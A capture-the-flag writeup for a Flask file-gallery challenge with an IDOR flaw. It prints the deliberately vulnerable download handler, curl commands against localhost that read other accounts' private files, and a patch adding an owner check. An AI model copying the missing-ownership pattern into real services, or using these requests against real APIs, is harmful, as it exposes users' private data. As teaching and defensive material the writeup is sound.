# Open Gallery — writeup

## Summary

- Stack: Python and Flask.
- Vulnerability: IDOR / broken object-level authorization.
- Root cause: the server verifies that a session exists but never checks who owns the selected file.
- Difficulty: intentionally beginner-friendly.
- Canonical exploit: [`jury/exploit.py`](../../tasks/round-3/open-gallery/jury/exploit.py).

## Service API

Registering through `POST /api/register` returns a random bearer token. The token can be used to upload a file:

```text
POST /api/files
Authorization: Bearer <token>
{"name":"private.txt","content":"secret"}
```

`GET /api/gallery` publicly lists file IDs and names, but not contents. Contents are downloaded through:

```text
GET /api/files/<id>
Authorization: Bearer <token>
```

The jury registers its own account and uploads ten flags as separate private files.

## Vulnerable code

The download handler appears to require authentication:

```python
if current_token() is None:
    return {"error": "bearer token required"}, 401
```

However, it then selects the file only by ID:

```python
with lock:
    if not 1 <= file_id <= len(files):
        return {"error": "file not found"}, 404
    item = files[file_id - 1]
    return {
        "id": item["id"],
        "name": item["name"],
        "content": item["content"],
    }
```

Ownership was stored during upload:

```python
files.append(
    {"id": file_id, "name": name, "content": content, "owner": token}
)
```

But `item["owner"]` is never compared with the current token. Any registered user can read every other user's files. Authentication exists; object-level authorization does not.

## Manual exploitation

Register an attacker account:

```bash
curl -s -H 'Content-Type: application/json' \
  -d '{"name":"attacker"}' \
  http://127.0.0.1:8000/api/register
```

Save the returned token and list public IDs:

```bash
curl -s http://127.0.0.1:8000/api/gallery
```

Read another user's file with the attacker's token:

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  http://127.0.0.1:8000/api/files/1
```

The response includes `content` even though the token does not belong to the file owner.

## Canonical exploit

The exploit registers a new user, obtains a valid token, lists `/api/gallery`, downloads every published ID with that token, and prints all contents matching the flag format. No token forgery, SQL injection or race condition is required.

## Correct patch

Keep the current token and compare it with the file owner:

```python
token = current_token()
if token is None:
    return {"error": "bearer token required"}, 401

with lock:
    if not 1 <= file_id <= len(files):
        return {"error": "file not found"}, 404
    item = files[file_id - 1]
    if item["owner"] != token:
        return {"error": "file belongs to another account"}, 403
    return {
        "id": item["id"],
        "name": item["name"],
        "content": item["content"],
    }
```

A production service should store a stable user ID instead of a bearer token as the owner. For this challenge model, exact token comparison is sufficient.

The checker registers a user, uploads a file and downloads it with the same token. The ownership check preserves this flow; disabling downloads fails the checker.

## Takeaway

The presence of an `Authorization` header does not imply correct authorization. After identifying the caller, the server must separately verify access to the requested object.
